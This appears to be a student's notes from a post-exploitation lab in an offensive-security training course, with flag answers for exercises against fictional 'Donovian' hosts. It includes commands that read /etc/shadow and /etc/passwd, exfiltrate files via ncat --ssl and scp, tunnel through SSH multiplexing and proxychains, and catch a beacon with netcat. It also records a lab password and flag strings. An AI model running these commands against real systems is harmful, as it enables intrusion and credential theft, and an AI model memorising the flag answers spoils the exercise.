@@ -1,0 +1,266 @@
+#DAY 6 POST EXPLOITATION
+
+_____________________________________________________________________________________
+
+#Local Host Enumeration 
+
+	Win: net user <-- users for current local group enumertates users 
+	Linux: cat /etc/passwd <-- user, group id, default shell, home directories
+					NOT passwords any user can access this 
+					and comments  
+	
+#Process Enumeration currenting running 
+
+	Windows
+
+		tasklist /v <-- runnign processes wmic 
+
+	Linux
+
+		ps -elf <-- not as gospel could run in cycle good start point 
+
+#Service Enumeration
+
+	Windows
+
+		tasklist /svc
+
+	Linux
+
+		chkconfig                   # SysV
+		systemctl --type=service    # SystemD all systems systemd 
+				--no-pager 
+
+#Network Connection Enumeration
+
+		
+	Windows
+
+		ipconfig /all
+
+	Linux
+
+		ifconfig -a      # SysV (deprecated) <-- phased out 
+		ip a             # SystemD are whi you think you are 
+
+#Data Exfiltration
+
+	Session Transcript
+
+		ssh <user>@<host> | tee <-- save file and display to screen
+					put file after 
+
+
+	Encrypted Transport
+
+		scp <source> <destination>
+		ncat --ssl <ip> <port> < <file>
+---------------------------------------------------------------------------------------
+#DEMO
+#first things to do after access on box:
+#metholody:
+
+	hostname && whoami <-- location
+	ip a <-- check for interfaces that are interesting
+	ip neigh 
+	use ping sweep <-- hostname enum
+		for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes 			from" &); done
+		
+	cat /etc/hosts <--- local dns file dns resolution check both sides 
+				every box 
+	ps -elf <-- running processes anything in square kernel level process 
+			ignore those look at os command to filter those out
+			 
+		look out for:
+		
+		cron rsyslod logs attackers avoid 
+		scripts    <-- look at all of them
+		anti virus rkhunter 
+#anti virus enum
+		
+	ls -latr /etc <-- hail marry order of modified anti virus at bottom 
+	ls -latr /var/logs <-- anti virus  
+			compare to linux ops to see outlier for all commands
+	systemctl --type=service --no-pager <-- anti virus
+	ls -latr /etc/cron* <-- anti virsu if in lin opps fine 
+	ls -latr /var/spool/crontab
+	ls -latr /var/spool/at
+	crontab -l <-- name of type of malware 
+
+#directory
+
+	tmp <-- good 
+	current user home directory and otehr users home directories 
+	touch . ? 
+	ls -latr <-- hidden folders and files used often  
+	find / -type d -name ".*" <-- hidden dir on entire filesystem 
+	sudo -l <-- list what you cna sud o
+	cat /etc/passwd <-- user added to sudo group
+	cat /etc/group | grep <user>
+
+#ryslog
+
+	less /etc/rsyslog.conf
+	less /etc/rsyslog.d/ <-- three files default.conf usually good stuff 
+	 grep -v "#" /etc/rsyslog.d/50-default.conf <-- shows what being log 
+	 everything that doesnt go to /var/log its weird adnormal so look at it
+	
+#crontab	
+	
+	crontab guru 
+	cat /etc/cron.d
+	ls -latr /etc/cron* <-- anti virsu if in lin opps fine 
+	ls -latr /var/spool/crontab
+	ls -latr /var/spool/at
+	crontab -l <-- name of type of malware 
+	
+#log files 
+
+	sudo cat /var/log/auth.log	
+			   cron.log
+	 sudo tail -n20 /var/log/auth.log
+	
+#sniffing
+
+	tcpdump
+	wireshark
+	nc ,-- execute bit needs to be turned on 
+	encoding base64
+		
+#scp dump
+
+	ssh _MS /tmp/young student@10.50.37.30
+	scp -o "ControlPath=/tmp/young" placeholder:/home/student/notreal.txt . 
+	scp -o "ControlPath=/tmp/young" .not_the_codes.txt anything:/	  		home/student/my_upload.txt 
+	scp -o "Conrolpath=/tmp/young" dummy:/etc/passwd home/student/passwd.txt
+	
+_________________________________________________________________________________
+
+#DAY 6 ACTIVTIES POST EXPLOTATION
+
+Scheme of Maneuver:
+>Jump Box
+->T1: 192.168.28.100 CentOS comrade :: StudentMidwayPassword 2222
+--->T3:x.x.x.9
+extra net intre net internal
+
+q8.Find a way to read a file on the Intranet target without using ssh. Show an instructor how you completed this to get the flag.	
+	
+	.100 extranet
+	ssh multiplex port 4000 
+	
+	192.168.28.98 dev ens3 lladdr fa:16:3e:d6:9b:15 STALE
+	192.168.28.99 dev ens3 lladdr fa:16:3e:34:34:66 STALE
+	192.168.28.97 dev ens3 lladdr fa:16:3e:89:99:66 REACHABLE
+
+	64 bytes from 192.168.28.9: icmp_seq=1 ttl=127 time=2.44 ms
+	64 bytes from 192.168.28.12: icmp_seq=1 ttl=63 time=1.26 ms
+	64 bytes from 192.168.28.27: icmp_seq=1 ttl=63 time=1.74 ms
+
+
+q1.Utilizing the intelligence provided, enumerate the target provided. Look for user generated documents, relating to network structure, on this host that will direct further actions.
+
+	make multiplex tunnel to the .100 
+	ls -latr hoem directory cd desktop and network ls-latr for the hidden 	mapkey.txt
+	mZe7VAbr6VdRmH4NWMwi
+	
+q2.The Donovian government is furthering their inventory expansion project. Identify and locate this intel to support this.
+
+	find / -type f -iname "*inventory*" 2>/dev/null
+	cat /usr/share/equip-inventory.txt
+	cyber chef decode base64 
+	OiOlGD6ossDObItWfWmY
+
+q.You have been tasked to collect intelligence relating to one of the Donovian General Officers.
+
+	cat /etc/hosts
+	192.168.150.253 Donovian-Intranet
+	Internal Network is xxx.xxx.28.9
+
+q3.Enumerate all network items, relating to name resolution.
+
+	 ssh -S /tmp/T1 -O forward -L4010:192.168.150.245:80 DUMB
+	firefox
+	nothing 
+	tunnel to it port 3201 multiplex port 4020 
+	same creds as T1
+	192.168.150.225 dev ens3 lladdr fa:16:3e:28:b6:ee REACHABLE
+	cat /etc/hosts
+	192.168.56.1   badguy
+	o6pXG3596mgGw6AFdOwe
+	
+q4.Enumerate all items related to syslog and rsyslog.
+
+	cat /etc/rsyslog.d/50-default.conf
+	uvu3bf0CH7Ab9wEGI3tW
+
+q5.Enumerate user directories on the machine. Find artifacts of malicious intent. You might need higher privileges...
+
+	cat /etc/passwd
+	root /root directroy odd check it out 
+	sudo more /root/brootkit/brootkit-master/br.conf
+	G8GN5IAeP2ah1cMWSTed
+
+
+q6.Enumerate for security products that may be installed on the system. (i.e. antivirus, etc.)
+
+	cat /var/log 
+	rkhunter has log look for conf file for rkhunter 
+	somewhere probably in etc 
+	/etc/rkhunter.conf
+	szVfHxrBbx2yQU5qnhOK
+
+q7.Enumerate information related the users on this system.
+
+	cat /etc/shadow 
+	xgU3llQ9U9paNCH41c5Z
+	
+q8.Enumerate items that would be related to jobs and tasks that running on the host, you may need to use higher privileges.
+
+	sudo crontab -l
+	dOBCNUPDywDmyofL1PTq
+
+q9.Find the beacon being received by the intranet host and determine how to interact with it.
+
+	lin.intranet.donovia.49934 > badguy.shell
+	badguy.smtp
+	badguy.1025
+	sudo tcpdump -nn '!(host 192.168.28.100)'
+	from the .135
+	notice port increments open nc lp port on next port by one  
+	nc -lp 12308
+	OXlDVUVzaUdrSGpQd3VXUTdjUHUK
+	9yCUEsiGkHjPwuWQ7cPu
+	
+q10.Find a way to read a file on the Intranet target without using ssh. Show an instructor how you completed this to get the flag.
+
+q11.You have been tasked to collect intelligence relating to one of the Donovian General Officers.192.168.28.9
+
+	throuygh our tunnel from T1 i figure 192.168.28.9 was the inertnal host 		for some reason only the T1 can access it got all the ports tyhropugh a 		dynmic tunnel proxychains port scan and then saw port 3389 open rdp use 		xfreerdp command to connect to it 
+	
+	xfreerdp /v:localhost:4050 /u:comrade /dynamic-resolution +glyph-cache 	+clipboard 
+	went through file explorer C:\users\generalstaz\Downloads
+	Donvian-Battle Brief 
+	iczasOrF3zw8LnBCi5Tq
+
+q12.The Gorgas Government has informed your team that sensitive technology data may be present within their Internal network. Enumerate directories critical to the OS and locate the data.
+
+	windows system32 
+	01NUCLEAR01
+	gorgas-mssile-program
+	PNDqxNRjsDiSPAIrXtJP
+
+q13.You have been tasked to validate whether a persistence mechanism has already been set on this host.
+
+	regedit
+	Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+	sfR7Kdesc9pAFIW3xEmG
+
+
+
+
+
+
+
+
+
